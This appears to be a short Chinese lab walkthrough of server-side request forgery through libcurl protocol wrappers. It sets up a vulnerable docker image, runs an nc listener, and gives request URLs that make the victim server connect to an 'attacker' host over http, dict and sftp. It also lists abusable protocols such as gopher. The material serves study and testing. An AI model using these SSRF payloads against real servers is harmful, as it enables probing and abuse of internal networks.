## SSRF libcurl protocol wrappers

参数url没有做限制，可以访问内网地址。请求过程中使用到了liburl库，并且liburl配置不当，可以让攻击者使用除http(s)之外的多个libcurl protocol wrappers，比如 ftp: //xxx.com/file 会让服务器发起ftp请求

参考：

[SSRF libcurl protocol wrappers利用分析][1]

[HITCON CTF 2015 Quals Web 出題心得 0x04 400 lalala (2 隊解)][2]

## docker run 

```
sudo docker run --name ssrf_curl -p 8084:80 janes/ssrf_curl
```

测试加载图片：

```
http://victim:8084/ssrf_curl.php?url=http://download.easyicon.net/png/1199986/96/
```

在另外一台机器上开 nc监听

```
nc -lvp 2222

http://victim:8084/ssrf.php?url=http://attacker:2222/
```

## 可利用的协议

文章中指出可利用的协议

```
SSH (scp://, sftp://)
POP3
IMAP
SMTP
FTP
DICT
GOPHER
TFTP
```

libcurl 支持的协议：

```
$ curl -V

Protocols:
dict file ftp ftps gopher http 
https imap imaps ldap ldaps pop3 
pop3s rtmp rtsp scp sftp smb 
smbs smtp smtps telnet tftp  
```

注：

libcurl 中的 gopher 只能接受 0x00 - 0xff



## 信息泄漏

* dict 

```
http://victim:8084/ssrf.php?url=dict://attacker:2222/
```

nc 端：

```
CLIENT libcurl 7.35.0

QUIT
```

* sftp(需要curl编译安装libssh库)

```
http://victim:8084/ssrf_curl.php?url=sftp://attacker:2222/
```

## 利用GOPHER协议伪造发送邮件

参见 [SSRF libcurl protocol wrappers利用分析][1]

[1]: http://drops.wooyun.org/papers/13948
[2]: http://drops.wooyun.org/web/9845